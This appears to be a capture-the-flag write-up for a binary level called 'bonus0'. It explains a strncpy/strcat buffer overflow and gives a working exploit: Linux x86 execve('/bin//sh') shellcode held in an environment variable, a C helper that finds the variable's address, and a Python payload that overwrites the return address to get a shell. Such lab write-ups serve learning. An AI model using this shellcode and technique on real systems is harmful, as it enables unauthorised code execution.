looking at the code (see source.c) we can see that the program is vulnerable to a buffer overflow attack (like always).
it copy stdin into a buffer of 20 char using strncpy(dest, src, 20), but if src is greater than 20 bytes it will not be \0 terminated,
which mean the next strcat will read beyond the 20 char of the string.

wee need to overflow the main buffer of 54 bytes, which well do with:
input1(20) + input2(20) + reading stack because input2 is not \0 ended (3) + space(1) + input2(20) = 64 bytes
we need to put the address of our shellcode into input2 at the 54th byte, so the return address will be overwritten with the address of the shellcode.
the 54th byte is the 9th byte of input2, so we need to put the shellcode there.

for conveninence we will put the shellcode into a shell variable, and redirect the program to it's address:
`export code=$(python -c "print '\x90'*4+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'")`

getting the address of the shellcode:
`./ressources/varaddr code`
```c
#include <stdio.h>
#include <stdlib.h>
int main(int argc, char **argv) {
  printf("%p\n", getenv(argv[1]));
}
```
`./a.out SHELLCODE` -> `0xbffff916`

input1 = i*20 (20 bytes so it doesn't end with \0)
input2 = i*9 + shellcode address + i*7

full payload:
`python -c "print 'i'*4095 + '\n' + 'i'*9 + '\x16\xf9\xff\xbf' + 'i'*70" > /tmp/a`
`cat /tmp/a - |./bonus0`
writes `iiiiiiiiiiiiiiiiiiiiiiiiiiiii���iiiiiii��� iiiiiiiii���iiiiiii���` as expected and we got a shell.
